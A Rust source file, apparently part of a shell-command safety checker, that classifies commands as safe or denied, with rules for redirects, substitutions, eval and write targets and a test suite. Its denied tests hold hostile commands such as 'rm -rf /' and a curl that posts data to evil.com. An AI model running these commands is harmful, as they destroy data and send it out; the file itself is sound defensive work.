use super::*;
use crate::handlers;
use crate::parse::Token;
use crate::verdict::{SafetyLevel, Verdict};

pub fn command_verdict(input: &str) -> Verdict {
    let Some(script) = parse(input) else {
        return Verdict::Denied;
    };
    script_verdict(&script)
}

pub fn is_safe_command(input: &str) -> bool {
    command_verdict(input).is_allowed()
}

fn script_verdict(script: &Script) -> Verdict {
    // HP-19 #2: track cwd across statements. Each statement is evaluated with the current
    // running cwd installed (so a later relative path resolves against it), and a `cd DIR`
    // statement updates that running cwd for the statements after it. Fail-open: an
    // unresolvable `cd` (bare / `~` / `$VAR`) leaves the running cwd unchanged.
    let mut running = crate::pathctx::cwd();
    let mut verdict = Verdict::Allowed(SafetyLevel::Inert);
    for stmt in &script.0 {
        let v = {
            let _cwd = crate::pathctx::enter_cwd(running.clone());
            pipeline_verdict(&stmt.pipeline)
        };
        verdict = verdict.combine(v);
        let next = cd_target(&stmt.pipeline).and_then(|t| crate::pathctx::join_cwd(running.as_deref(), &t));
        if next.is_some() {
            running = next;
        }
    }
    verdict
}

/// The target of a statement-level `cd DIR` (a single simple command named `cd`), for cwd
/// tracking. `None` for anything else, or `cd` with no plain positional (bare `cd`, `cd -`).
fn cd_target(pipeline: &Pipeline) -> Option<String> {
    let [Cmd::Simple(s)] = pipeline.commands.as_slice() else {
        return None;
    };
    if s.words.first()?.eval() != "cd" {
        return None;
    }
    s.words.iter().skip(1).map(|w| w.eval()).find(|a| !a.starts_with('-'))
}

#[cfg(test)]
pub(crate) fn is_safe_script(script: &Script) -> bool {
    script_verdict(script).is_allowed()
}

pub(crate) fn pipeline_verdict(pipeline: &Pipeline) -> Verdict {
    pipeline.commands.iter()
        .map(cmd_verdict)
        .fold(Verdict::Allowed(SafetyLevel::Inert), Verdict::combine)
}

pub fn is_safe_pipeline(pipeline: &Pipeline) -> bool {
    pipeline_verdict(pipeline).is_allowed()
}

pub(crate) fn has_unsafe_syntax(cmd: &Cmd) -> bool {
    match cmd {
        Cmd::Simple(s) => !check_redirects(&s.redirs) || has_any_substitution(s),
        _ => true,
    }
}

fn has_any_substitution(cmd: &SimpleCmd) -> bool {
    cmd.words.iter().any(has_substitution)
        || cmd.env.iter().any(|(_, v)| has_substitution(v))
}

pub(crate) fn normalize_for_matching(cmd: &SimpleCmd) -> String {
    cmd.words.iter().map(|w| w.eval()).collect::<Vec<_>>().join(" ")
}

pub(crate) fn cmd_verdict(cmd: &Cmd) -> Verdict {
    match cmd {
        Cmd::Simple(s) => simple_verdict(s),
        Cmd::Subshell { body, redirs } | Cmd::BraceGroup { body, redirs } => {
            let body_v = script_verdict(body);
            if let Verdict::Denied = body_v {
                return Verdict::Denied;
            }
            let redir_v = redirect_verdict(redirs);
            if let Verdict::Denied = redir_v {
                return Verdict::Denied;
            }
            body_v.combine(redir_v)
        }
        Cmd::For { items, body, redirs, .. } => {
            let redir_v = redirect_verdict(redirs);
            if let Verdict::Denied = redir_v {
                return Verdict::Denied;
            }
            words_sub_verdict(items)
                .combine(script_verdict(body))
                .combine(redir_v)
        }
        Cmd::While { cond, body, redirs } | Cmd::Until { cond, body, redirs } => {
            let redir_v = redirect_verdict(redirs);
            if let Verdict::Denied = redir_v {
                return Verdict::Denied;
            }
            script_verdict(cond)
                .combine(script_verdict(body))
                .combine(redir_v)
        }
        Cmd::If {
            branches,
            else_body,
            redirs,
        } => {
            let redir_v = redirect_verdict(redirs);
            if let Verdict::Denied = redir_v {
                return Verdict::Denied;
            }
            let mut v = redir_v;
            for b in branches {
                v = v.combine(script_verdict(&b.cond)).combine(script_verdict(&b.body));
            }
            if let Some(eb) = else_body {
                v = v.combine(script_verdict(eb));
            }
            v
        }
        Cmd::DoubleBracket { words, redirs } => {
            words_sub_verdict(words).combine(redirect_verdict(redirs))
        }
    }
}

pub(crate) fn is_safe_cmd(cmd: &Cmd) -> bool {
    cmd_verdict(cmd).is_allowed()
}

fn part_sub_verdict(part: &WordPart) -> Verdict {
    match part {
        WordPart::CmdSub(inner) | WordPart::ProcSub(inner) => script_verdict(inner),
        WordPart::Backtick(raw) => command_verdict(raw),
        WordPart::DQuote(inner) => word_sub_verdict(inner),
        _ => Verdict::Allowed(SafetyLevel::Inert),
    }
}

fn word_sub_verdict(word: &Word) -> Verdict {
    word.0.iter()
        .map(part_sub_verdict)
        .fold(Verdict::Allowed(SafetyLevel::Inert), Verdict::combine)
}

fn words_sub_verdict(words: &[Word]) -> Verdict {
    words.iter()
        .map(word_sub_verdict)
        .fold(Verdict::Allowed(SafetyLevel::Inert), Verdict::combine)
}

#[cfg(test)]
pub(crate) fn word_subs_safe(word: &Word) -> bool {
    word_sub_verdict(word).is_allowed()
}

fn simple_verdict(cmd: &SimpleCmd) -> Verdict {
    let redir_v = redirect_verdict(&cmd.redirs);
    if let Verdict::Denied = redir_v {
        return Verdict::Denied;
    }

    let env_sub_v = cmd.env.iter()
        .map(|(_, v)| word_sub_verdict(v))
        .fold(Verdict::Allowed(SafetyLevel::Inert), Verdict::combine);
    let word_sub_v = words_sub_verdict(&cmd.words);
    let sub_v = env_sub_v.combine(word_sub_v);

    if let Verdict::Denied = sub_v {
        return Verdict::Denied;
    }

    if cmd.words.is_empty() {
        if cmd.env.is_empty() {
            return Verdict::Allowed(SafetyLevel::Inert);
        }
        return sub_v.combine(redir_v);
    }

    if cmd.words[0].eval() == "eval" {
        return eval_verdict(cmd).combine(sub_v).combine(redir_v);
    }

    let tokens: Vec<Token> = cmd.words.iter().map(|w| Token::from_raw(w.eval())).collect();
    if tokens.is_empty() {
        return Verdict::Allowed(SafetyLevel::Inert);
    }

    let cmd_v = leaf_verdict(&tokens);
    sub_v.combine(cmd_v).combine(redir_v)
}

/// The command leaf's verdict, gated by the engine mode (`…-engine` §4). In `legacy`
/// (default) the legacy classifier is authoritative and the engine never runs; in `new`
/// the engine is authoritative for commands it can resolve and legacy handles the rest.
fn leaf_verdict(tokens: &[Token]) -> Verdict {
    let legacy = handlers::dispatch(tokens);
    crate::engine::bridge::apply_mode(crate::engine::bridge::mode(), legacy, tokens)
}

fn eval_verdict(cmd: &SimpleCmd) -> Verdict {
    if cmd.words.len() < 2 {
        return Verdict::Denied;
    }
    for arg in &cmd.words[1..] {
        if !arg_is_eval_safe(arg) {
            return Verdict::Denied;
        }
    }
    Verdict::Allowed(SafetyLevel::Inert)
}

fn arg_is_eval_safe(word: &Word) -> bool {
    let mut found_safe = false;
    for part in &word.0 {
        match part {
            WordPart::Lit(s) | WordPart::SQuote(s) => {
                if !s.chars().all(char::is_whitespace) {
                    return false;
                }
            }
            WordPart::Escape(c) => {
                if !c.is_whitespace() {
                    return false;
                }
            }
            WordPart::CmdSub(script) => {
                if !script_yields_eval_safe(script) {
                    return false;
                }
                found_safe = true;
            }
            WordPart::Backtick(raw) => {
                let Some(script) = parse(raw) else {
                    return false;
                };
                if !script_yields_eval_safe(&script) {
                    return false;
                }
                found_safe = true;
            }
            WordPart::DQuote(inner) => {
                if !arg_is_eval_safe(inner) {
                    return false;
                }
                if has_substitution(inner) {
                    found_safe = true;
                }
            }
            WordPart::ProcSub(_) | WordPart::Arith(_) => return false,
        }
    }
    found_safe
}

fn script_yields_eval_safe(script: &Script) -> bool {
    if script.0.len() != 1 {
        return false;
    }
    let stmt = &script.0[0];
    if !matches!(stmt.op, None | Some(ListOp::Semi)) {
        return false;
    }
    let pipeline = &stmt.pipeline;
    if pipeline.bang || pipeline.commands.len() != 1 {
        return false;
    }
    let Cmd::Simple(s) = &pipeline.commands[0] else {
        return false;
    };
    if !s.env.is_empty() {
        return false;
    }
    // A redirect inside the substitution is allowed only if it's inert:
    // stderr suppression (`2>/dev/null`), an fd dup (`2>&1`), or `/dev/null`.
    // A redirect that writes a real file is SafeWrite, not inert, so
    // `mise activate bash > evil` is rejected — eval-safe must not gain a
    // file-write side effect, and diverting stdout to a file is pointless here.
    if redirect_verdict(&s.redirs) != Verdict::Allowed(SafetyLevel::Inert) {
        return false;
    }
    for w in &s.words {
        if !word_is_plain_literal(w) {
            return false;
        }
    }
    let tokens: Vec<Token> = s.words.iter().map(|w| Token::from_raw(w.eval())).collect();
    if tokens.is_empty() {
        return false;
    }
    crate::registry::is_eval_safe_invocation(&tokens)
}

/// True iff every character of `word` is drawn from the bare-literal
/// alphabet: ASCII alphanumerics plus `_`, `-`, `.`, `/`, `=`. Words
/// matching this shape consist entirely of identifier-style or
/// path-style tokens that the shell will pass through to the
/// substituted command unchanged at runtime.
///
/// Required for words inside eval-safe substitutions because the
/// "stdout is shell-init code" trust depends on the contributor having
/// vetted what gets passed to the tool. Restricting the alphabet to
/// chars with no shell-expansion semantics keeps the substituted
/// invocation static across parse-time and runtime — what you see in
/// the source is what the tool receives.
fn word_is_plain_literal(word: &Word) -> bool {
    word.0.iter().all(part_is_plain_literal)
}

fn part_is_plain_literal(part: &WordPart) -> bool {
    match part {
        WordPart::Lit(s) | WordPart::SQuote(s) => s.chars().all(is_bare_literal_char),
        WordPart::Escape(c) => is_bare_literal_char(*c),
        WordPart::DQuote(inner) => word_is_plain_literal(inner),
        WordPart::CmdSub(_) | WordPart::ProcSub(_) | WordPart::Backtick(_) | WordPart::Arith(_) => false,
    }
}

/// Bare-literal alphabet: ASCII alphanumerics plus a tight punctuation
/// set covering identifiers (`_`, `-`), versions / paths (`.`, `/`),
/// and the long-flag value form (`=`). New chars require an explicit
/// eval-safe use case — add by extending this match, never by
/// excluding individual hostile chars.
fn is_bare_literal_char(c: char) -> bool {
    c.is_ascii_alphanumeric() || matches!(c, '_' | '-' | '.' | '/' | '=')
}

pub(crate) fn check_redirects(redirs: &[Redir]) -> bool {
    redirs.iter().all(|r| match r {
        Redir::Write { target, .. } => target.eval() == "/dev/null",
        Redir::Read { .. }
        | Redir::HereStr(_)
        | Redir::HereDoc { .. }
        | Redir::DupFd { .. } => true,
    })
}

/// Whether a redirect *write* target is an ordinary data file we can
/// auto-approve. Safe: a relative path inside the working tree, or a temp/std
/// path. Not safe (falls through to manual approval): home dotfiles and any
/// path another tool auto-executes or trusts — `.git/` (hooks, config), a
/// `.envrc` (direnv runs it on `cd`), `~`-anchored and absolute system paths,
/// and parent-escaping paths. A redirect there can plant a git hook, an SSH
/// key, or a shell/direnv init that runs later. A `$`-bearing target is
/// unverifiable (it may expand to `$HOME/.ssh/...`), so it is treated as unsafe.
fn is_safe_write_target(path: &str) -> bool {
    // HP-19: resolve a relative target against the harness cwd/root first, so `cd /etc &&
    // echo > ./x` is scored as writing `/etc/x`. No context → path unchanged (status quo).
    let resolved = crate::pathctx::resolve(path);
    let path: &str = &resolved;
    if path.starts_with("/tmp/")
        || path.starts_with("/private/tmp/")
        || path.starts_with("/var/tmp/")
        || path.starts_with("/dev/stdout")
        || path.starts_with("/dev/stderr")
        || path.starts_with("/dev/fd/")
    {
        return true;
    }
    if path.starts_with('/') || path.starts_with('~') || path.contains('$') {
        return false;
    }
    if path == ".." || path.starts_with("../") || path.contains("/../") || path.ends_with("/..") {
        return false;
    }
    !path.split('/').any(|seg| seg == ".git" || seg == ".envrc")
}

pub(crate) fn redirect_verdict(redirs: &[Redir]) -> Verdict {
    let mut level = Verdict::Allowed(SafetyLevel::Inert);
    for r in redirs {
        match r {
            Redir::Write { target, .. } => {
                level = level.combine(word_sub_verdict(target));
                let t = target.eval();
                if t == "/dev/null" {
                    // Inert: no side effect, no promotion.
                } else if is_safe_write_target(&t) {
                    level = level.combine(Verdict::Allowed(SafetyLevel::SafeWrite));
                } else {
                    level = level.combine(Verdict::Denied);
                }
            }
            Redir::Read { target, .. } => {
                level = level.combine(word_sub_verdict(target));
            }
            Redir::HereStr(word) => {
                level = level.combine(word_sub_verdict(word));
            }
            Redir::HereDoc { .. } | Redir::DupFd { .. } => {}
        }
    }
    level
}

fn has_substitution(word: &Word) -> bool {
    word.0.iter().any(|p| match p {
        WordPart::CmdSub(_) | WordPart::ProcSub(_) | WordPart::Backtick(_) | WordPart::Arith(_) => true,
        WordPart::DQuote(inner) => has_substitution(inner),
        _ => false,
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    fn check(cmd: &str) -> bool {
        is_safe_command(cmd)
    }

    safe! {
        grep_foo: "grep foo file.txt",
        cat_etc_hosts: "cat /etc/hosts",
        jq_key: "jq '.key' file.json",
        base64_d: "base64 -d",
        ls_la: "ls -la",
        wc_l: "wc -l file.txt",
        ps_aux: "ps aux",
        echo_hello: "echo hello",
        cat_file: "cat file.txt",

        version_go: "go --version",
        version_cargo: "cargo --version",
        version_cargo_redirect: "cargo --version 2>&1",
        help_cargo: "cargo --help",
        help_cargo_build: "cargo build --help",

        dev_null_echo: "echo hello > /dev/null",
        dev_null_stderr: "echo hello 2> /dev/null",
        dev_null_append: "echo hello >> /dev/null",
        dev_null_git_log: "git log > /dev/null 2>&1",
        fd_redirect_ls: "ls 2>&1",
        stdin_dev_null: "git log < /dev/null",

        env_prefix: "FOO='bar baz' ls -la",
        env_prefix_dq: "FOO=\"bar baz\" ls -la",
        env_rack_rspec: "RACK_ENV=test bundle exec rspec spec/foo_spec.rb",

        subst_echo_ls: "echo $(ls)",
        subst_ls_pwd: "ls `pwd`",
        subst_nested: "echo $(echo $(ls))",
        subst_quoted: "echo \"$(ls)\"",
        assign_subst_ls: "out=$(ls)",
        assign_subst_git: "out=$(git status)",
        assign_subst_multiple: "a=$(ls) b=$(pwd)",
        assign_subst_backtick: "out=`ls`",

        assign_bare_lit: "foo=bar",
        assign_bare_int: "x=1",
        assign_bare_empty: "x=",
        assign_bare_dq: "x=\"foo bar\"",
        assign_bare_sq: "x='foo bar'",
        assign_bare_param: "rc=$?",
        assign_bare_var: "x=$y",
        assign_bare_dollar_var_braced: "x=${y}",
        assign_bare_path: "PATH=/foo",
        assign_bare_multiple: "a=1 b=2 c=3",
        assign_bare_arith: "x=$((1 + 2))",
        assign_in_for_body: "for i in 1 2; do x=1; done",
        assign_rc_in_for_body: "for i in 1 2; do echo $i; rc=$?; done",
        assign_rc_in_while_body: "while test -f /tmp/x; do rc=$?; sleep 1; done",
        assign_rc_in_if_body: "if test -f foo; then rc=$?; fi",
        assign_then_use: "x=1; echo $x",
        assign_chained_with_safe: "x=1 && ls",
        assign_subshell: "(x=1)",
        assign_in_subshell_with_cmd: "(x=1; ls)",

        subshell_echo: "(echo hello)",
        subshell_ls: "(ls)",
        subshell_chain: "(ls && echo done)",
        subshell_pipe: "(ls | grep foo)",
        subshell_nested: "((echo hello))",
        subshell_for: "(for x in 1 2; do echo $x; done)",

        pipe_grep_head: "grep foo file.txt | head -5",
        pipe_cat_sort_uniq: "cat file | sort | uniq",
        chain_ls_echo: "ls && echo done",
        semicolon_ls_echo: "ls; echo done",
        bg_ls_echo: "ls & echo done",
        newline_echo_echo: "echo foo\necho bar",

        stdin_read_from_path: "wc -l < /tmp/foo.log",
        stdin_read_from_etc: "grep foo < /etc/hosts",
        stdin_read_in_subst: "while [ $(wc -l < /tmp/x) -lt 10 ]; do sleep 5; done",
        stdin_read_in_for_body: "for i in 1 2; do cat < /tmp/x; done",

        here_string_grep: "grep -c , <<< 'hello,world,test'",
        heredoc_cat: "cat <<EOF\nhello world\nEOF",
        heredoc_quoted: "cat <<'EOF'\nhello\nEOF",
        heredoc_strip_tabs: "cat <<-EOF\n\thello\nEOF",
        heredoc_no_content: "cat <<EOF",
        heredoc_pipe: "cat <<EOF | grep hello\nhello\nEOF",

        for_echo: "for x in 1 2 3; do echo $x; done",
        for_empty_body: "for x in 1 2 3; do; done",
        for_nested: "for x in 1 2; do for y in a b; do echo $x $y; done; done",
        for_safe_subst: "for x in $(seq 1 5); do echo $x; done",
        while_test: "while test -f /tmp/foo; do sleep 1; done",
        while_negation: "while ! test -f /tmp/done; do sleep 1; done",
        until_test: "until test -f /tmp/ready; do sleep 1; done",
        if_then_fi: "if test -f foo; then echo exists; fi",
        if_then_else_fi: "if test -f foo; then echo yes; else echo no; fi",
        if_elif: "if test -f a; then echo a; elif test -f b; then echo b; else echo c; fi",
        nested_if_in_for: "for x in 1 2; do if test $x = 1; then echo one; fi; done",
        bare_negation: "! echo hello",
        keyword_as_data: "echo for; echo done; echo if; echo fi",

        quoted_redirect: "echo 'greater > than' test",
        quoted_subst: "echo '$(safe)' arg",

        redirect_to_file: "echo hello > file.txt",
        redirect_append: "cat file >> output.txt",
        redirect_stderr_file: "ls 2> errors.txt",
        redirect_bidirectional_write: "cat < /tmp/x > /tmp/y",
        env_rails_redirect: "RAILS_ENV=test echo foo > bar",
        jj_diff_redirect_chain: "jj diff -r 'master..@' --context 5 > /tmp/review_diff.txt && wc -l /tmp/review_diff.txt",

        arith_basic: "echo $((1 + 2))",
        arith_with_var: "prev=$((ln - 1))",
        arith_nested_parens: "echo $(( (1 + 2) * 3 ))",
        arith_in_dquote: "echo \"line $((ln - 1))\"",
        arith_in_for_loop: "for i in 1 2; do echo $((i * 10)); done",

        dbracket_eq: "[[ \"a\" == \"a\" ]]",
        dbracket_neq: "[[ \"a\" != \"b\" ]]",
        dbracket_file_test: "[[ -f /tmp/file ]]",
        dbracket_string_empty: "[[ -z \"$var\" ]]",
        dbracket_string_nonempty: "[[ -n \"$var\" ]]",
        dbracket_regex: "[[ \"$x\" =~ ^[0-9]+$ ]]",
        dbracket_and: "[[ \"$x\" == \"y\" && \"$z\" == \"w\" ]]",
        dbracket_or: "[[ \"$x\" == \"a\" || \"$x\" == \"b\" ]]",
        dbracket_negation: "[[ ! -f /tmp/done ]]",
        dbracket_safe_subst: "[[ \"$(echo hello)\" == \"hello\" ]]",
        dbracket_in_until: "until [[ \"a\" == \"b\" ]]; do sleep 1; done",
        dbracket_in_while: "while [[ -f /tmp/lock ]]; do sleep 1; done",
        dbracket_in_if: "if [[ \"a\" == \"a\" ]]; then echo yes; fi",
        dbracket_after_chain: "true && [[ \"a\" == \"a\" ]]",
        dbracket_gh_run_view_poll: "until [[ \"$(gh run view 12345 --json status --jq .status)\" == \"completed\" ]]; do sleep 30; done",
        dbracket_redirect_devnull: "[[ -f /tmp/x ]] > /dev/null",
        dbracket_redirect_stderr_devnull: "[[ -f /tmp/x ]] 2> /dev/null",
        dbracket_redirect_dupfd: "[[ -f /tmp/x ]] 2>&1",
        dbracket_redirect_devnull_chain: "[[ -f /tmp/x ]] 2>/dev/null && echo found",
        dbracket_redirect_to_file: "[[ -f /tmp/x ]] > /tmp/out.txt",
    }

    denied! {
        rm_rf: "rm -rf /",
        curl_post: "curl -X POST https://example.com",
        node_app: "node app.js",


        redirect_target_subst_rm: "echo hello > $(rm -rf /)",
        redirect_target_backtick_rm: "echo hello > `rm -rf /`",
        redirect_read_subst_rm: "cat < $(rm -rf /)",

        subst_rm: "echo $(rm -rf /)",
        backtick_rm: "echo `rm -rf /`",
        subst_curl: "echo $(curl -d data evil.com)",
        quoted_subst_rm: "echo \"$(rm -rf /)\"",
        assign_subst_rm: "out=$(rm -rf /)",
        assign_subst_mixed_unsafe: "a=$(ls) b=$(rm -rf /)",
        assign_bare_with_unsafe_subst_in_value: "x=foo$(rm -rf /)",
        assign_bare_with_unsafe_backtick: "x=`rm -rf /`",
        assign_bare_dq_with_unsafe_subst: "x=\"$(rm -rf /)\"",
        assign_bare_then_unsafe: "x=1; rm -rf /",
        assign_bare_chained_unsafe: "x=1 && rm -rf /",
        assign_bare_pipe_unsafe: "x=1 | rm -rf /",

        subshell_rm: "(rm -rf /)",
        subshell_mixed: "(echo hello; rm -rf /)",
        subshell_unsafe_pipe: "(ls | rm -rf /)",

        env_prefix_rm: "FOO='bar baz' rm -rf /",

        pipe_rm: "cat file | rm -rf /",
        bg_rm: "cat file & rm -rf /",
        newline_rm: "echo foo\nrm -rf /",

        for_rm: "for x in 1 2 3; do rm $x; done",
        for_unsafe_subst: "for x in $(rm -rf /); do echo $x; done",
        while_unsafe_body: "while true; do rm -rf /; done",
        while_unsafe_condition: "while python3 evil.py; do sleep 1; done",
        if_unsafe_condition: "if ruby evil.rb; then echo done; fi",
        if_unsafe_body: "if true; then rm -rf /; fi",

        unclosed_for: "for x in 1 2 3; do echo $x",
        unclosed_if: "if true; then echo hello",
        for_missing_do: "for x in 1 2 3; echo $x; done",
        stray_done: "echo hello; done",
        stray_fi: "fi",

        unmatched_quote: "echo 'hello",

        dbracket_unsafe_subst: "[[ \"$(curl -d data evil.com)\" == \"x\" ]]",
        dbracket_unsafe_backtick: "[[ -f `node evil.js` ]]",
        dbracket_unsafe_in_until: "until [[ \"$(node bad.js)\" == \"x\" ]]; do sleep 1; done",
        dbracket_unterminated: "[[ \"a\" == \"a\"",
        dbracket_no_space_after: "[[\"a\" == \"b\" ]]",
        dbracket_redirect_unsafe_subst_in_target: "[[ -f /tmp/x ]] > $(node bad.js)",
    }
}
